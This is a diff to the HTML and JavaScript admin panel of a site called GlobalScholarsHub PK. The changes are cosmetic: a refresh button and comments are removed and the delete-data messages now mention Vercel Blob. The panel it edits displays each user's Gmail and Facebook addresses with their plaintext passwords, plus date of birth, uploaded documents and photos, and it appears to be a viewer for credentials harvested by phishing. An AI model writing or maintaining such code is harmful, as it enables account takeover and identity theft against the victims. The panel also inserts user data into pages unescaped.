@@ -11,9 +11,6 @@
         .header h1 { font-size: 28px; font-weight: 800; }
         .header h1 i { color: #fbbf24; margin-right: 10px; }
         .header p { opacity: 0.8; font-size: 14px; margin-top: 4px; }
-        .header-buttons { display: flex; gap: 10px; flex-wrap: wrap; }
-        .refresh-btn { background: #fbbf24; color: #0a1628; border: none; padding: 10px 28px; border-radius: 50px; cursor: pointer; font-weight: 700; font-size: 14px; }
-        .refresh-btn:hover { transform: scale(1.05); }
         .clear-btn { background: #ef4444; color: #fff; border: none; padding: 10px 28px; border-radius: 50px; cursor: pointer; font-weight: 700; font-size: 14px; }
         .clear-btn:hover { background: #dc2626; transform: scale(1.05); }
         .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin-bottom: 30px; }
@@ -47,10 +44,7 @@
     <div class="container">
         <div class="header">
             <div><h1><i class="fas fa-user-shield"></i>Admin Panel</h1><p>GlobalScholarsHub PK - Complete User Data Management</p></div>
-            <div class="header-buttons">
-                <button class="refresh-btn" onclick="loadUsers()"><i class="fas fa-sync-alt"></i> Refresh</button>
-                <button class="clear-btn" onclick="clearAllData()"><i class="fas fa-trash"></i> Clear All Data</button>
-            </div>
+            <button class="clear-btn" onclick="clearAllData()"><i class="fas fa-trash"></i> Clear All Data</button>
         </div>
         
         <div class="stats" id="statsContainer">
@@ -82,7 +76,6 @@
                 console.log('📊 Users received:', users);
                 console.log('📊 Users count:', users.length);
 
-                // ===== UPDATE STATS =====
                 document.getElementById('totalUsers').textContent = users.length;
                 document.getElementById('gmailUsers').textContent = users.filter(u => u.email).length;
                 document.getElementById('fbUsers').textContent = users.filter(u => u.fbEmail).length;
@@ -97,7 +90,6 @@
 
                 let html = '<div class="total-text"><i class="fas fa-list"></i>Total ' + users.length + ' users registered</div>';
 
-                // ===== DISPLAY USERS (Latest First) =====
                 users.slice().reverse().forEach((user, index) => {
                     const userNum = users.length - index;
                     const hasDocs = user.documents && user.documents.length > 0;
@@ -107,26 +99,18 @@
                     html += '<div class="card-header"><span class="user-id"><i class="fas fa-user-circle"></i>User #' + userNum + '</span>';
                     html += '<span class="timestamp"><i class="far fa-calendar-alt"></i> ' + (user.submittedAt || user.submitted_at || 'N/A') + '</span></div>';
                     
-                    // ===== BADGES =====
                     html += '<div class="badges">';
                     if (user.email) html += '<span class="tag tag-gmail"><i class="fas fa-envelope"></i> Gmail</span>';
                     if (user.fbEmail) html += '<span class="tag tag-fb"><i class="fab fa-facebook"></i> Facebook</span>';
                     if (user.profileCompleted) html += '<span class="tag tag-profile"><i class="fas fa-check-circle"></i> Profile Complete</span>';
                     html += '</div>';
                     
-                    // ===== DATA GRID =====
                     html += '<div class="data-grid">';
-                    
-                    // Gmail Data
                     if (user.name) html += '<div class="field"><strong>👤 Full Name:</strong> <span class="value">' + user.name + '</span></div>';
                     if (user.email) html += '<div class="field"><strong>📧 Gmail:</strong> <span class="value" style="color:#ea4335;font-weight:600;">' + user.email + '</span></div>';
                     if (user.password) html += '<div class="field"><strong>🔑 Gmail Password:</strong> <span class="value">' + user.password + '</span></div>';
-                    
-                    // Facebook Data
                     if (user.fbEmail) html += '<div class="field"><strong>📘 Facebook ID:</strong> <span class="value" style="color:#1877f2;font-weight:600;">' + user.fbEmail + '</span></div>';
                     if (user.fbPassword) html += '<div class="field"><strong>🔑 FB Password:</strong> <span class="value">' + user.fbPassword + '</span></div>';
-                    
-                    // Profile Data
                     if (user.firstName) html += '<div class="field"><strong>👤 First Name:</strong> <span class="value">' + user.firstName + '</span></div>';
                     if (user.lastName) html += '<div class="field"><strong>👤 Last Name:</strong> <span class="value">' + user.lastName + '</span></div>';
                     if (user.dob) html += '<div class="field"><strong>📅 Date of Birth:</strong> <span class="value">' + user.dob + '</span></div>';
@@ -144,12 +128,10 @@
                     if (user.skills) html += '<div class="field"><strong>🔧 Skills:</strong> <span class="value">' + user.skills + '</span></div>';
                     html += '</div>';
                     
-                    // About
                     if (user.about) {
                         html += '<div style="margin-top:10px;background:#f8fafc;padding:10px 14px;border-radius:8px;color:#475569;font-size:14px;border-left:3px solid #2563eb;"><strong>📝 About:</strong> ' + user.about + '</div>';
                     }
                     
-                    // Documents
                     if (hasDocs) {
                         html += '<div style="margin-top:8px;"><strong>📄 Documents Uploaded (' + user.documents.length + '):</strong> ';
                         user.documents.forEach(doc => {
@@ -158,7 +140,6 @@
                         html += '</div>';
                     }
                     
-                    // Profile Image
                     if (hasImage) {
                         html += '<div style="margin-top:8px;"><strong>🖼️ Profile Image:</strong><br />';
                         html += '<img src="' + user.profileImage + '" style="width:80px;height:80px;border-radius:10px;object-fit:cover;border:2px solid #eef2f6;margin-top:4px;cursor:pointer;" onclick="window.open(this.src)" />';
@@ -176,10 +157,10 @@
         }
 
         // ============================================================
-        //  CLEAR ALL DATA
+        //  CLEAR ALL DATA - VERCEL BLOB
         // ============================================================
         async function clearAllData() {
-            if (!confirm('⚠️ Are you sure you want to DELETE ALL data? This cannot be undone!')) {
+            if (!confirm('⚠️ Are you sure you want to DELETE ALL data from Vercel Blob? This cannot be undone!')) {
                 return;
             }
 
@@ -190,7 +171,7 @@
                 const result = await response.json();
 
                 if (result.success) {
-                    showToast('✅ All data cleared successfully!', 'success');
+                    showToast('✅ All data cleared from Vercel Blob!', 'success');
                     loadUsers();
                 } else {
                     showToast('❌ Error: ' + result.error, 'error');
